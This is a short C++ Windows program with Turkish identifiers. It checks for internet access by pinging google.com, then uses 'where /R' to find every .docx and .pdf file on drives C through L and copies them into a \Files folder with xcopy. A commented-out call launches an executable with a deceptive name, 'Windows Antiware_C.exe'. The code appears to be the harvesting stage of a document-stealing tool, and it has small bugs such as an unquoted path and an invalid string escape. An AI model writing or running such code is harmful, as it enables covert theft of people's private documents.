#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <Windows.h>
#include <winsock.h>

using namespace std;

int internet_kontrol(){
    system("ping www.google.com > logs.txt");

    ifstream ping_dosya_acici("logs.txt", ios::in);

    if(ping_dosya_acici.is_open()){

        bool kelime_bulamama = true;
        string ping_dosya_tutucu;

        while(getline(ping_dosya_acici, ping_dosya_tutucu)){

            if(ping_dosya_tutucu.find("TTL", 0) != string::npos){
            	
                kelime_bulamama = false;
                return 1;
            }
        }

        if(kelime_bulamama == true){

            return 0;
        }
    }

    else{

        return 2;
    }
}

int Dosya_bulma(){
	
	system("where /R C: *.docx *.pdf > logs_2.txt");
	system("where /R D: *.docx *.pdf >> logs_2.txt");
	system("where /R E: *.docx *.pdf >> logs_2.txt");
	system("where /R F: *.docx *.pdf >> logs_2.txt");
	system("where /R G: *.docx *.pdf >> logs_2.txt");
	system("where /R K: *.docx *.pdf >> logs_2.txt");
	system("where /R L: *.docx *.pdf >> logs_2.txt");
	
	ifstream dosya_yol_acici("logs_2.txt", ios::in);

    if(dosya_yol_acici.is_open()){

        string dosya_yol_tutucu;
        string komut_string;
        
        while(getline(dosya_yol_acici, dosya_yol_tutucu)){

			komut_string = "xcopy " + dosya_yol_tutucu + " \Files /C /Y";
            system(komut_string.c_str());
        }
	}
	
	else{
		return 2;
	}

}

int main(){

	if(internet_kontrol() == 1){
		
		/*system("Windows Antiware_C.exe");*/
	}
	
	else{
		
		return 3;
		
	}
	
	Dosya_bulma();

    return 0;
}
